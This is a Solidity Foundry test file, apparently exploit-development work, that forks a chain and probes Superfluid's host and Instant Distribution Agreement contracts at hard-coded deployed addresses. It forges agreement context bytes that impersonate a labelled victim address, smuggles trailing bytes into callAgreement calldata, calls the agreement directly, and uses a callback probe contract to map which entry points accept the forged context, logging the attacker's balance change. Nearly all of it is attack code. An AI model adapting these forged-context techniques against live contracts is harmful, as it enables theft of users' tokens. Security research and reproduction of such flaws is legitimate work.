// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function getHost() external view returns (address);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function isApp(address app) external view returns (bool);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function distribute(
        ISuperToken token,
        uint32 indexId,
        uint256 amount,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function approveSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    )
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface ISuperApp {
    function beforeAgreementCreated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementCreated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function beforeAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function beforeAgreementTerminated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementTerminated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt3
/// @notice Creative escalation around ch5's `claim()`-only surface:
///         1. map which nearby IDA entry points still reject forged ctx,
///         2. compare direct claim, plain host claim, and trailing-bytes host claim,
///         3. check whether an unregistered contract subscriber ever receives a callback,
///         4. sample `isApp/getAppManifest` on the concrete contracts we are touching.
contract Attempt3 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    address constant HOST_IMPL = 0x513b7C5c6B7d8b21A14d6D5536878fB0a803BeF4;
    address constant IDA_IMPL = 0x848497975f5757Aa1a48e13bbF46D330E62b19A7;
    address constant CFA_IMPL = 0x6EeE6060f715257b970700bc2656De21dEdF074C;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant ATTACKER_CLAIM_PLAIN_ID = 55_300_001;
    uint32 constant ATTACKER_CLAIM_TRAILING_ID = 55_300_002;
    uint32 constant ATTACKER_CLAIM_DIRECT_ID = 55_300_003;
    uint32 constant DIRECT_UPDATE_SUBSCRIPTION_ID = 55_300_011;
    uint32 constant DIRECT_UPDATE_INDEX_ID = 55_300_012;
    uint32 constant DIRECT_DISTRIBUTE_ID = 55_300_013;
    uint32 constant DIRECT_APPROVE_ID = 55_300_014;
    uint32 constant DIRECT_CLAIM_ID = 55_300_015;
    uint32 constant TRAILING_UPDATE_SUBSCRIPTION_ID = 55_300_021;
    uint32 constant TRAILING_UPDATE_INDEX_ID = 55_300_022;
    uint32 constant TRAILING_DISTRIBUTE_ID = 55_300_023;
    uint32 constant TRAILING_APPROVE_ID = 55_300_024;
    uint32 constant TRAILING_CLAIM_ID = 55_300_025;
    uint32 constant DIRECT_CREATE_INDEX_ID = 55_300_031;
    uint32 constant TRAILING_CREATE_INDEX_ID = 55_300_032;
    uint32 constant PROBE_PLAIN_ID = 55_300_041;
    uint32 constant PROBE_TRAILING_ID = 55_300_042;
    uint32 constant PROBE_DIRECT_ID = 55_300_043;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    ISuperToken constant USDCX = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(HOST_IMPL, "HostImpl");
        vm.label(IDA_IMPL, "IDAImpl");
        vm.label(CFA_IMPL, "CFAImpl");
        vm.label(address(MATICX), "MATICx");
        vm.label(address(USDCX), "USDCx");
    }

    function test_claim_surface_matrix() public {
        uint256 nativeBefore = ATTACKER.balance;

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] MATICx host:", MATICX.getHost());
        console.log("[preflight] victim USDCx:", USDCX.balanceOf(KNOWN_USDCX_VICTIM));

        ClaimCallbackProbe probe = new ClaimCallbackProbe(HOST, IDA, MATICX);
        vm.label(address(probe), "ClaimCallbackProbe");

        _logAppStatus("attacker", ATTACKER);
        _logAppStatus("probe", address(probe));
        _logAppStatus("host", address(HOST));
        _logAppStatus("host impl", HOST_IMPL);
        _logAppStatus("ida", address(IDA));
        _logAppStatus("ida impl", IDA_IMPL);
        _logAppStatus("cfa impl", CFA_IMPL);
        _logAppStatus("MATICx", address(MATICX));
        _logAppStatus("USDCx", address(USDCX));
        _logAppStatus("known victim", KNOWN_USDCX_VICTIM);

        vm.startPrank(ATTACKER);
        MATICX.upgradeByETH{value: 16}();
        _seedAttackerIndex(ATTACKER_CLAIM_PLAIN_ID);
        _seedAttackerIndex(ATTACKER_CLAIM_TRAILING_ID);
        _seedAttackerIndex(ATTACKER_CLAIM_DIRECT_ID);
        _seedAttackerIndex(DIRECT_UPDATE_SUBSCRIPTION_ID);
        _seedAttackerIndex(DIRECT_UPDATE_INDEX_ID);
        _seedAttackerIndex(DIRECT_DISTRIBUTE_ID);
        _seedAttackerIndex(DIRECT_APPROVE_ID);
        _seedAttackerIndex(DIRECT_CLAIM_ID);
        _seedAttackerIndex(TRAILING_UPDATE_SUBSCRIPTION_ID);
        _seedAttackerIndex(TRAILING_UPDATE_INDEX_ID);
        _seedAttackerIndex(TRAILING_DISTRIBUTE_ID);
        _seedAttackerIndex(TRAILING_APPROVE_ID);
        _seedAttackerIndex(TRAILING_CLAIM_ID);
        vm.stopPrank();

        vm.startPrank(ATTACKER);
        probe.seedIndex{value: 1}(PROBE_PLAIN_ID);
        probe.seedIndex{value: 1}(PROBE_TRAILING_ID);
        probe.seedIndex{value: 1}(PROBE_DIRECT_ID);
        vm.stopPrank();

        bytes memory fakeClaimCtx = _buildFakeClaimContext(address(probe), address(MATICX));
        bytes memory fakeVictimCtx = _buildForgedContext(KNOWN_USDCX_VICTIM, IDA.createIndex.selector);
        bytes memory fakeVictimClaimCtx = _buildFakeClaimContext(address(probe), address(MATICX));
        ContextUtils.Context memory victimClaim = ContextUtils.decodeContext(fakeVictimClaimCtx);
        victimClaim.msgSender = KNOWN_USDCX_VICTIM;
        fakeVictimClaimCtx = ContextUtils.encodeContext(victimClaim);

        _logSubscriptionState("attacker-plain", ATTACKER, ATTACKER_CLAIM_PLAIN_ID, ATTACKER);
        _logSubscriptionState("attacker-trailing", ATTACKER, ATTACKER_CLAIM_TRAILING_ID, ATTACKER);
        _logSubscriptionState("attacker-direct", ATTACKER, ATTACKER_CLAIM_DIRECT_ID, ATTACKER);
        _logSubscriptionState("probe-plain", address(probe), PROBE_PLAIN_ID, address(probe));
        _logSubscriptionState("probe-trailing", address(probe), PROBE_TRAILING_ID, address(probe));
        _logSubscriptionState("probe-direct", address(probe), PROBE_DIRECT_ID, address(probe));

        _runAttackerClaimMatrix(fakeClaimCtx, fakeVictimClaimCtx);
        _runProbeClaimMatrix(probe, fakeClaimCtx);
        _runDirectMatrix(fakeClaimCtx);
        _runHostTrailingMatrix(fakeVictimCtx, fakeVictimClaimCtx);

        uint256 nativeAfter = ATTACKER.balance;
        int256 nativeDelta = int256(nativeAfter) - int256(nativeBefore);
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeDelta);
    }

    function _seedAttackerIndex(uint32 indexId) internal {
        _callAgreementOrRevert(abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))), "seed createIndex");
        _callAgreementOrRevert(
            abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, ATTACKER, uint128(1), new bytes(0))),
            "seed updateSubscription"
        );
        _callAgreementOrRevert(abi.encodeCall(IDA.updateIndex, (MATICX, indexId, uint128(1), new bytes(0))), "seed updateIndex");
    }

    function _callAgreementOrRevert(bytes memory inner, string memory step) internal {
        (bool ok, bytes memory ret) = _callAgreementRaw(inner);
        require(ok, string.concat(step, ": ", _decodeRevert(ret)));
    }

    function _callAgreementRaw(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _buildForgedContext(address msgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(msgSender, selector, "");
        return ContextUtils.encodeContext(ctx);
    }

    function _runAttackerClaimMatrix(bytes memory fakeClaimCtx, bytes memory fakeVictimClaimCtx) internal {
        console.log("[matrix] host plain claim on attacker-owned pending index");
        vm.prank(ATTACKER);
        (bool hostPlainClaimOk, bytes memory hostPlainClaimRet) = _callAgreementRaw(
            abi.encodeCall(IDA.claim, (MATICX, ATTACKER, ATTACKER_CLAIM_PLAIN_ID, ATTACKER, new bytes(0)))
        );
        _logCall("host plain claim", hostPlainClaimOk, hostPlainClaimRet, true);

        console.log("[matrix] host trailing-bytes claim on attacker-owned pending index");
        vm.prank(ATTACKER);
        (bool hostTrailingClaimOk, bytes memory hostTrailingClaimRet) = _callAgreementWithTrailingBytes(
            abi.encodeCall(IDA.claim, (MATICX, ATTACKER, ATTACKER_CLAIM_TRAILING_ID, ATTACKER, fakeVictimClaimCtx))
        );
        _logCall("host trailing claim", hostTrailingClaimOk, hostTrailingClaimRet, true);

        console.log("[matrix] direct claim on attacker-owned pending index");
        vm.prank(ATTACKER);
        (bool directClaimOk, bytes memory directClaimRet) = address(IDA).call(
            abi.encodeCall(IDA.claim, (MATICX, ATTACKER, ATTACKER_CLAIM_DIRECT_ID, ATTACKER, fakeClaimCtx))
        );
        _logCall("direct claim", directClaimOk, directClaimRet, true);
    }

    function _runProbeClaimMatrix(ClaimCallbackProbe probe, bytes memory fakeClaimCtx) internal {
        console.log("[callback] probe host plain claim");
        vm.prank(ATTACKER);
        probe.claimViaHostPlain(PROBE_PLAIN_ID);
        _logProbeState("probe host plain", probe);

        console.log("[callback] probe host trailing claim");
        vm.prank(ATTACKER);
        probe.claimViaHostTrailing(PROBE_TRAILING_ID, fakeClaimCtx);
        _logProbeState("probe host trailing", probe);

        console.log("[callback] probe direct claim");
        vm.prank(ATTACKER);
        (bool probeDirectOk, bytes memory probeDirectRet) = address(IDA).call(
            abi.encodeCall(IDA.claim, (MATICX, address(probe), PROBE_DIRECT_ID, address(probe), fakeClaimCtx))
        );
        _logCall("probe direct claim", probeDirectOk, probeDirectRet, true);
        _logProbeState("probe direct", probe);
    }

    function _runDirectMatrix(bytes memory fakeClaimCtx) internal {
        console.log("[direct-matrix] createIndex");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) =
                address(IDA).call(abi.encodeCall(IDA.createIndex, (MATICX, DIRECT_CREATE_INDEX_ID, new bytes(0))));
            _logCall("direct createIndex", ok, ret);
        }

        console.log("[direct-matrix] updateSubscription");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = address(IDA).call(
                abi.encodeCall(
                    IDA.updateSubscription, (MATICX, DIRECT_UPDATE_SUBSCRIPTION_ID, ATTACKER, uint128(2), new bytes(0))
                )
            );
            _logCall("direct updateSubscription", ok, ret);
        }

        console.log("[direct-matrix] updateIndex");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) =
                address(IDA).call(abi.encodeCall(IDA.updateIndex, (MATICX, DIRECT_UPDATE_INDEX_ID, uint128(2), new bytes(0))));
            _logCall("direct updateIndex", ok, ret);
        }

        console.log("[direct-matrix] distribute");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) =
                address(IDA).call(abi.encodeCall(IDA.distribute, (MATICX, DIRECT_DISTRIBUTE_ID, 1, new bytes(0))));
            _logCall("direct distribute", ok, ret);
        }

        console.log("[direct-matrix] approveSubscription");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = address(IDA).call(
                abi.encodeCall(IDA.approveSubscription, (MATICX, ATTACKER, DIRECT_APPROVE_ID, new bytes(0)))
            );
            _logCall("direct approveSubscription", ok, ret);
        }

        console.log("[direct-matrix] claim");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) =
                address(IDA).call(abi.encodeCall(IDA.claim, (MATICX, ATTACKER, DIRECT_CLAIM_ID, ATTACKER, fakeClaimCtx)));
            _logCall("direct matrix claim", ok, ret, true);
        }
    }

    function _runHostTrailingMatrix(bytes memory fakeVictimCtx, bytes memory fakeVictimClaimCtx) internal {
        console.log("[host-trailing-matrix] createIndex");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) =
                _callAgreementWithTrailingBytes(abi.encodeCall(IDA.createIndex, (MATICX, TRAILING_CREATE_INDEX_ID, fakeVictimCtx)));
            _logCall("host trailing createIndex", ok, ret);
        }

        console.log("[host-trailing-matrix] updateSubscription");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(
                    IDA.updateSubscription,
                    (MATICX, TRAILING_UPDATE_SUBSCRIPTION_ID, ATTACKER, uint128(2), fakeVictimCtx)
                )
            );
            _logCall("host trailing updateSubscription", ok, ret);
        }

        console.log("[host-trailing-matrix] updateIndex");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(IDA.updateIndex, (MATICX, TRAILING_UPDATE_INDEX_ID, uint128(2), fakeVictimCtx))
            );
            _logCall("host trailing updateIndex", ok, ret);
        }

        console.log("[host-trailing-matrix] distribute");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(IDA.distribute, (MATICX, TRAILING_DISTRIBUTE_ID, 1, fakeVictimCtx))
            );
            _logCall("host trailing distribute", ok, ret);
        }

        console.log("[host-trailing-matrix] approveSubscription");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(IDA.approveSubscription, (MATICX, ATTACKER, TRAILING_APPROVE_ID, fakeVictimCtx))
            );
            _logCall("host trailing approveSubscription", ok, ret);
        }

        console.log("[host-trailing-matrix] claim");
        vm.prank(ATTACKER);
        {
            (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(IDA.claim, (MATICX, ATTACKER, TRAILING_CLAIM_ID, ATTACKER, fakeVictimClaimCtx))
            );
            _logCall("host trailing matrix claim", ok, ret, true);
        }
    }

    function _buildFakeClaimContext(address appAddress, address appCreditToken) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(appAddress, IDA.claim.selector, "");
        ctx.appCreditGranted = type(uint128).max;
        ctx.appAddress = appAddress;
        ctx.appCreditToken = appCreditToken;
        return ContextUtils.encodeContext(ctx);
    }

    function _logAppStatus(string memory label, address app) internal view {
        (bool isSuperApp, bool isJailed, uint256 noopMask) = HOST.getAppManifest(app);
        console.log("[app-check]", label);
        console.log("  addr:", app);
        console.log("  isApp:", HOST.isApp(app));
        console.log("  manifest.isSuperApp:", isSuperApp);
        console.log("  manifest.isJailed:", isJailed);
        console.log("  manifest.noopMask:", noopMask);
    }

    function _logSubscriptionState(string memory label, address publisher, uint32 indexId, address subscriber) internal view {
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IDA.getSubscription(MATICX, publisher, indexId, subscriber);
        console.log("[sub-state]", label);
        console.log("  publisher:", publisher);
        console.log("  subscriber:", subscriber);
        console.log("  exists:", exist);
        console.log("  approved:", approved);
        console.log("  units:", units);
        console.log("  pending:", pending);
    }

    function _logProbeState(string memory label, ClaimCallbackProbe probe) internal view {
        console.log("[probe]", label);
        console.log("  hostPlainOk:", probe.hostPlainClaimOk());
        console.log("  hostTrailingOk:", probe.hostTrailingClaimOk());
        console.log("  callback calls:", probe.afterUpdatedCalls());
        console.log("  last ctx msgSender:", probe.lastCtxMsgSender());
        console.log("  last ctx appAddress:", probe.lastCtxAppAddress());
        console.log("  last ctx appCreditGranted:", probe.lastCtxAppCreditGranted());
        console.log("  last ctx appCreditToken:", probe.lastCtxAppCreditToken());
        console.log("  hostPlain revert:");
        console.logBytes(probe.hostPlainClaimRevertData());
        console.log("  hostTrailing revert:");
        console.logBytes(probe.hostTrailingClaimRevertData());
    }

    function _logCall(string memory label, bool ok, bytes memory ret) internal {
        console.log("[call]", label);
        console.log("  ok:", ok);
        if (ok) {
            if (ret.length > 0) {
                console.log("  wrapped return bytes:");
                console.logBytes(ret);
            }
        } else {
            console.log("  revert:");
            console.logBytes(ret);
            console.log("  decoded:");
            console.log(_decodeRevert(ret));
        }
    }

    function _logCall(string memory label, bool ok, bytes memory ret, bool decodeCtx) internal {
        _logCall(label, ok, ret);
        if (decodeCtx && ok) {
            console.log("  decoded ctx: skipped (host/direct return wrapping is not uniform)");
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) {
                return "silent revert";
            }
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }

    receive() external payable {}
}

contract ClaimCallbackProbe is ISuperApp {
    ISuperfluidHost public immutable host;
    IInstantDistributionAgreementV1 public immutable ida;
    ISETH public immutable token;

    bool public hostPlainClaimOk;
    bytes public hostPlainClaimRevertData;
    bool public hostTrailingClaimOk;
    bytes public hostTrailingClaimRevertData;
    uint256 public afterUpdatedCalls;
    address public lastCtxMsgSender;
    address public lastCtxAppAddress;
    uint256 public lastCtxAppCreditGranted;
    address public lastCtxAppCreditToken;

    constructor(ISuperfluidHost host_, IInstantDistributionAgreementV1 ida_, ISETH token_) {
        host = host_;
        ida = ida_;
        token = token_;
    }

    function seedIndex(uint32 indexId) external payable {
        token.upgradeByETH{value: msg.value}();
        _callAgreement(abi.encodeCall(ida.createIndex, (token, indexId, new bytes(0))));
        _callAgreement(abi.encodeCall(ida.updateSubscription, (token, indexId, address(this), uint128(1), new bytes(0))));
        _callAgreement(abi.encodeCall(ida.updateIndex, (token, indexId, uint128(1), new bytes(0))));
    }

    function claimViaHostPlain(uint32 indexId) external {
        (hostPlainClaimOk, hostPlainClaimRevertData) = address(host).call(
            abi.encodeCall(
                host.callAgreement,
                (ida, abi.encodeCall(ida.claim, (token, address(this), indexId, address(this), new bytes(0))), new bytes(0))
            )
        );
    }

    function claimViaHostTrailing(uint32 indexId, bytes calldata fakeCtx) external {
        bytes memory inner = abi.encodeCall(ida.claim, (token, address(this), indexId, address(this), fakeCtx));
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        (hostTrailingClaimOk, hostTrailingClaimRevertData) =
            address(host).call(abi.encodeCall(host.callAgreement, (ida, outer, new bytes(0))));
    }

    function beforeAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    function beforeAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx) {
        afterUpdatedCalls += 1;
        ContextUtils.Context memory decoded = ContextUtils.decodeContext(ctx);
        lastCtxMsgSender = decoded.msgSender;
        lastCtxAppAddress = decoded.appAddress;
        lastCtxAppCreditGranted = decoded.appCreditGranted;
        lastCtxAppCreditToken = decoded.appCreditToken;
        return ctx;
    }

    function beforeAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    function _callAgreement(bytes memory callData) internal {
        (bool ok, bytes memory ret) = address(host).call(abi.encodeCall(host.callAgreement, (ida, callData, new bytes(0))));
        require(ok, _decodeRevert(ret));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "probe helper failed";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }
        if (selector != 0x08c379a0) {
            return "probe helper failed";
        }

        assembly {
            revertData := add(revertData, 4)
        }
        return abi.decode(revertData, (string));
    }

    receive() external payable {}
}
